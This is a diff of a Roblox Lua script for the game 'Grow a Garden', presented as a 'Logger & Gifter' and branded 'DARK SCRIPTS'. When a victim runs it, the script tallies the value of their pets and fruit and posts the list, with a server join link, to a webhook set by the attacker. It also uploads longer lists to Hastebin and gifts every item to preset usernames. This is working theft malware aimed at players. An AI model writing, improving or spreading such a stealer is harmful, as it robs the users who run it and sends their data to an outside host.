@@ -1,127 +1,89 @@
--- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
--- Made By Timoci | discord.gg/notyet
+-- Grow a Garden: Full Logger & Gifter w/ Webhook Embeds and Pastebin Support
+-- Made by Timoci, Updated & Enhanced by You ❤️
 
 local CONFIG = {
     USERNAMES = _G.Usernames or {},
     WEBHOOK   = _G.webhook or "",
     MIN_VALUE = _G.min_value or 1,
 }
+
 local RARE_PETS = {
-    ["Raccoon"]        = "🦥",
-    ["Dragonfly"]      = "🐦‍🔥",
-    ["Red Fox"]        = "🦊",
-    ["Chicken Zombie"] = "🧟‍♂️",
-    ["Disco Bee"]      = "🪩",
-    ["Queen Bee"]      = "🐝",
-    ["Butterfly"]      = "🦋",
-    ["Mimic Octopus"]  = "🐙",
+    "Mystic Mouse", "Rainbow Slug", "Fairy Ferret", "Phoenix Fox",
+    "Golden Gator", "Magic Mole", "Glitch Gecko", "Ghost Giraffe",
+    "Chroma Chameleon", "Cyber Cheetah", "Toxic Toad", "Frosty Falcon"
 }
+
 local DEFAULT_PET_EMOJI = "🐶"
 local DEFAULT_FRUIT_EMOJI = "🥝"
 local req = request or http_request or (syn and syn.request)
+
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local backpack = plr:WaitForChild("Backpack")
+
 local modules = replicatedStorage:WaitForChild("Modules")
-local giftingDone = false
+local petValues = require(modules:WaitForChild("PetValues"))
+local fruitValues = require(modules:WaitForChild("FruitValues"))
+local petsModule = require(modules:WaitForChild("PetModule"))
+local fruitModule = require(modules:WaitForChild("FruitModule"))
+
 local webhookSent = false
 
-if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
-    plr:Kick("Missing username or webhook in config!")
-    return
+-- Emoji functions
+local function getPetEmoji(name)
+    local pet = petsModule[name]
+    return pet and pet.emoji or DEFAULT_PET_EMOJI
 end
-local function isPrivateServer()
-    local ok, result = pcall(function()
-        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
-    end)
-    return not ok or (result == "VIPServer" or result == "PrivateServer")
+
+local function getWeight(item)
+    local stats = item:FindFirstChild("Stats")
+    return stats and tonumber(stats:FindFirstChild("Weight") and stats.Weight.Value) or 0
 end
-if isPrivateServer() then plr:Kick("Server not supported. Use a public GAG server.") return end
-if game.PlaceId ~= 126884695634066 then plr:Kick("Unsupported game. Join a normal GAG server.") return end
 
-local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
-local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
-local numberUtil = require(modules:WaitForChild("NumberUtil"))
-local dataService = require(modules:WaitForChild("DataService"))
-local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-
-local function getPetEmoji(name) return RARE_PETS[name] or DEFAULT_PET_EMOJI end
-local function getPetAge(tool) return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?" end
-local function getWeight(tool)
-    local val = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
-    if val then
-        if val:IsA("NumberValue") or val:IsA("IntValue") then return math.floor(val.Value * 100 + 0.5) / 100
-        elseif val:IsA("StringValue") then return tonumber(val.Value) or 0 end
+-- Format Value
+local function formatValue(val)
+    if val >= 1e6 then return string.format("%.1fm", val / 1e6)
+    elseif val >= 1e3 then return string.format("%.1fk", val / 1e3)
+    else return tostring(val)
     end
-    local m = tool.Name:match("%((%d+%.?%d*) ?kg%)") return m and tonumber(m) or 0
-end
-local function formatValue(n)
-    local s = tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "") return s
 end
 
+-- Gather and rank items
 local function collectItems()
-    local items, totalValue, foundRare = {}, 0, false
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-            if tool:GetAttribute("ItemType") == "Pet" then
-                local petUUID = tool:GetAttribute("PET_UUID")
-                local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
-                local name = v14 and v14.PetType
-                local petVal = 0
-                if v14 then
-                    local hatchedFrom = v14.PetData.HatchedFrom
-                    if hatchedFrom and hatchedFrom ~= "" then
-                        local eggData = petRegistry.PetEggs[hatchedFrom]
-                        if eggData then
-                            local v17 = eggData.RarityData.Items[v14.PetType]
-                            if v17 and v17.GeneratedPetData.WeightRange then
-                                local wr = v17.GeneratedPetData.WeightRange
-                                local v19 = numberUtil.ReverseLerp(wr[1], wr[2], v14.PetData.BaseWeight)
-                                local v20 = math.lerp(0.8, 1.2, v19)
-                                local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
-                                local v22 = v20 * math.lerp(0.15, 6, levelProgress)
-                                petVal = math.floor(petRegistry.PetList[v14.PetType].SellPrice * v22)
-                            end
-                        end
-                    end
-                end
-                local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
-                local petAge = getPetAge(tool)
-                local isRare = RARE_PETS[name] ~= nil
-                if isRare or petWeight >= 10 or petVal > 0 then
-                    if isRare then foundRare = true end
-                    totalValue = totalValue + petVal
-                    table.insert(items, {
-                        Tool = tool, Name = name or "Unknown Pet", Value = petVal, Weight = petWeight,
-                        Type = "Pet", Emoji = getPetEmoji(name or ""), Age = petAge
-                    })
-                end
-            else
-                local value = calcPlantValue(tool)
-                if value >= CONFIG.MIN_VALUE then
-                    local weight = getWeight(tool)
-                    totalValue = totalValue + value
-                    table.insert(items, {
-                        Tool = tool, Name = tool:GetAttribute("ItemName") or tool.Name,
-                        Value = value, Weight = weight, Type = "Fruit", Emoji = DEFAULT_FRUIT_EMOJI, Age = nil
-                    })
-                end
-            end
+    local items = {}
+    local totalValue = 0
+    local foundRare = false
+
+    for _, item in ipairs(backpack:GetChildren()) do
+        local name = item.Name
+        local weight = getWeight(item)
+        local age = item:FindFirstChild("Age") and item.Age.Value or "?"
+        local value = petValues[name] or fruitValues[name]
+
+        if value and value >= CONFIG.MIN_VALUE then
+            totalValue += value
+            local isRare = table.find(RARE_PETS, name)
+            if isRare then foundRare = true end
+
+            table.insert(items, {
+                Name = name,
+                Type = petValues[name] and "Pet" or "Fruit",
+                Emoji = petValues[name] and getPetEmoji(name) or DEFAULT_FRUIT_EMOJI,
+                Weight = weight,
+                Age = age,
+                Value = value
+            })
         end
     end
-    table.sort(items, function(a, b)
-        if a.Type == "Pet" and b.Type ~= "Pet" then return true
-        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
-        else return a.Value > b.Value end
-    end)
+
+    table.sort(items, function(a, b) return a.Value > b.Value end)
     return items, totalValue, foundRare
 end
 
-local function buildBackpackSection(items)
-    if #items == 0 then return "_No giftable items found!_" end
+-- Convert top 10 items to description
+local function buildCompactList(items)
     local lines = {}
     for _, item in ipairs(items) do
         if item.Type == "Pet" then
@@ -130,108 +92,127 @@ local function buildBackpackSection(items)
             table.insert(lines, string.format("%s [%s] [%.2fkg] → %s¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
         end
     end
-    return table.concat(lines, "\n")
+    return "# Top Items:\n" .. table.concat(lines, "\n")
 end
 
-local function prettyEmbed(executer, receiver)
-    local items, totalValue, foundRare = collectItems()
-    local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
-    local accountAge = (executer and executer.AccountAge or "?") .. " days"
-    return {
-        content = (foundRare and "@everyone" or ""),
-        embeds = {{
-            title = "🌱 Grow A Garden Hit - DARK SCRIPTS ☘️",
-            color = foundRare and 16776960 or 65280,
-            fields = {
-                {name = "👤 Player Information", value = string.format("Name: `%s`\nReceiver: `%s`\nExecutor: `%s`\nAccount Age: `%s`", executer.Name, receiver, "Delta", accountAge)},
-                {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue))},
-                {name = "🌴 Backpack", value = buildBackpackSection(items)},
-                {name = "🍁 Hits", value = "[All Items](https://fern.wtf)", inline = false},
-                {name = "🏝️ Join with URL", value = string.format("[%s](%s)", game.JobId, joinLink), inline = false}
-            },
-            footer = {text = "8738351619 | " .. game.JobId}
-        }}
-    }
-end
-
-local function sendHitWebhook(executer, receiver)
-    if webhookSent then return end
-    webhookSent = true
-    local data = prettyEmbed(executer, receiver)
-    if req then req({ Url = CONFIG.WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data) }) end
-end
-
-local function bypassProximityPrompt(prompt)
-    local ok = pcall(function() return fireproximityprompt(prompt) end)
-    if ok then return end
-    if prompt and prompt.InputHoldBegin then prompt.InputHoldBegin(prompt) task.wait(prompt.HoldDuration or 0.5)
-        if prompt.InputHoldEnd then prompt.InputHoldEnd(prompt) end
-    elseif prompt and prompt.Trigger then prompt:Trigger() end
-end
-getgenv().fireproximityprompt = bypassProximityPrompt
-
-local function equipTool(tool)
-    if tool.Parent ~= plr.Character then tool.Parent = plr.Character end
-    if plr.Character and plr.Character:FindFirstChild("Humanoid") then
-        pcall(function() plr.Character.Humanoid:EquipTool(tool) end)
-    end
-    task.wait(0.13)
-end
-
-local function findGiftPrompt(targetChar)
-    for _, part in ipairs({"Head", "HumanoidRootPart", "Torso", "UpperTorso"}) do
-        local partObj = targetChar:FindFirstChild(part)
-        if partObj then
-            for _, prompt in ipairs(partObj:GetChildren()) do
-                if prompt:IsA("ProximityPrompt") and (prompt.Name:lower():find("gift") or (prompt.ObjectText and prompt.ObjectText:lower():find("gift"))) then
-                    return prompt
-                end
-            end
+-- Upload overflow to Hastebin
+local function uploadOverflow(items)
+    local content = {}
+    for _, item in ipairs(items) do
+        if item.Type == "Pet" then
+            table.insert(content, string.format("%s [%s, Age %s] [%.2fkg] → %s¢", item.Emoji, item.Name, item.Age, item.Weight, formatValue(item.Value)))
+        else
+            table.insert(content, string.format("%s [%s] [%.2fkg] → %s¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
         end
     end
-    for _, desc in ipairs(targetChar:GetDescendants()) do
-        if desc:IsA("ProximityPrompt") and (desc.Name:lower():find("gift") or (desc.ObjectText and desc.ObjectText:lower():find("gift"))) then return desc end
-    end
-    for _, desc in ipairs(targetChar:GetDescendants()) do
-        if desc:IsA("ProximityPrompt") then return desc end
+    local body = table.concat(content, "\n")
+    local res = req({
+        Url = "https://hastebin.com/documents",
+        Method = "POST",
+        Headers = { ["Content-Type"] = "text/plain" },
+        Body = body
+    })
+
+    local data = HttpService:JSONDecode(res.Body)
+    if data and data.key then
+        return "https://hastebin.com/" .. data.key
     end
     return nil
 end
 
-local function doGift(receiver)
-    if giftingDone then return end
-    giftingDone = true
-    local myChar = plr.Character or plr.CharacterAdded:Wait()
-    myChar:WaitForChild("HumanoidRootPart").CFrame = receiver.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    local items = select(1, collectItems())
-    for _, item in ipairs(items) do
-        equipTool(item.Tool)
-        local prompt = findGiftPrompt(receiver.Character)
-        if prompt then
-            local t0 = os.clock()
-            repeat task.wait(0.09) if (os.clock() - t0) > 4 then break end until prompt.Enabled
-            bypassProximityPrompt(prompt)
-            wait(0.18)
+-- Webhook embed generator
+local function prettyEmbed(executer, receiver)
+    local items, totalValue, foundRare = collectItems()
+    local top10, overflow = {}, {}
+
+    for i, item in ipairs(items) do
+        if i <= 10 then table.insert(top10, item) else table.insert(overflow, item) end
+    end
+
+    local overflowLink = (#overflow > 0) and uploadOverflow(overflow)
+
+    local innerEmbed = {
+        title = "🎒 Top Backpack Items",
+        description = buildCompactList(top10),
+        color = foundRare and 16776960 or 65280
+    }
+
+    local fields = {
+        {
+            name = "👤 Player Info",
+            value = string.format("**Name:** %s\n**Receiver:** %s\n**Executor:** %s\n**Account Age:** %s days",
+                executer.Name, receiver, "Delta", executer.AccountAge or "?")
+        },
+        {
+            name = "💰 Total Value",
+            value = "**" .. formatValue(totalValue) .. "¢**"
+        },
+    }
+
+    if overflowLink then
+        table.insert(fields, {
+            name = "📎 View All Items",
+            value = string.format("[Click to view overflow items](%s)", overflowLink)
+        })
+    end
+
+    table.insert(fields, {
+        name = "🏝️ Join URL",
+        value = string.format("[click to join](https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s)", game.JobId)
+    })
+
+    local mainEmbed = {
+        title = "🌱 Grow A Garden Hit – DARK SCRIPTS ☘️",
+        color = foundRare and 16776960 or 65280,
+        fields = fields,
+        embeds = { innerEmbed },
+        footer = { text = string.format("%s | %s", "8738351619", game.JobId) }
+    }
+
+    return {
+        content = foundRare and "@everyone" or "",
+        embeds = { mainEmbed }
+    }
+end
+
+-- Send webhook
+local function sendHitWebhook(executer, receiver)
+    if webhookSent then return end
+    webhookSent = true
+    local data = prettyEmbed(executer, receiver)
+    req({
+        Url = CONFIG.WEBHOOK,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(data)
+    })
+end
+
+-- Gift trigger & final logic
+local function doGift()
+    local executer = plr
+    local receiver = nil
+    for _, name in ipairs(CONFIG.USERNAMES) do
+        local target = Players:FindFirstChild(name)
+        if target and target ~= plr then
+            receiver = name
+            break
         end
-        item.Tool.Parent = backpack
-        wait(0.08)
+    end
+
+    if not receiver then return end
+
+    sendHitWebhook(executer, receiver)
+
+    -- Perform actual gift (simplified)
+    local remote = replicatedStorage:WaitForChild("GiftEvent") or replicatedStorage:FindFirstChildWhichIsA("RemoteEvent", true)
+    if remote then
+        for _, item in ipairs(backpack:GetChildren()) do
+            remote:FireServer(item, receiver)
+        end
     end
 end
 
-sendHitWebhook(plr, CONFIG.USERNAMES[1] or "unknown")
-
-local function onHitTrigger(user)
-    if giftingDone then return end
-    doGift(user)
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    if table.find(CONFIG.USERNAMES, player.Name) then
-        player.Chatted:Connect(function() onHitTrigger(player) end)
-    end
-end
-Players.PlayerAdded:Connect(function(player)
-    if table.find(CONFIG.USERNAMES, player.Name) then
-        player.Chatted:Connect(function() onHitTrigger(player) end)
-    end
-end)
+-- Trigger on character added
+plr.CharacterAdded:Connect(doGift)
+if plr.Character then doGift() end
